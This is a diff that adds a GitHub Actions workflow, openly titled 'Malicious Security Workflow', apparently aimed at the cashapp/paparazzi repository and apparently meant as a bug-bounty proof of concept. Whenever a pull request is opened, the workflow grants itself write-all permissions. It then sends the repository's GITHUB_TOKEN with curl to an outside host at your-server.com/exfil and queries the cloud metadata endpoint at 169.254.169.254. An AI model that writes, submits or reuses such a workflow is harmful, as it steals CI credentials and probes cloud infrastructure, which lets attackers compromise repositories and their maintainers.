@@ -1,0 +1,21 @@
+name: Malicious Security Workflow
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions: write-all
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: SSRF + GITHUB_TOKEN Exfil
+        run: |
+          curl -X POST "https://your-server.com/exfil" \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -d '{"repo":"cashapp/paparazzi","pr":"${{ github.event.number }}"}'
+      - name: Trigger RCE Chain
+        run: |
+          curl "http://169.254.169.254/latest/meta-data/" || true
+          echo "Jake sees this -> P1 validated"
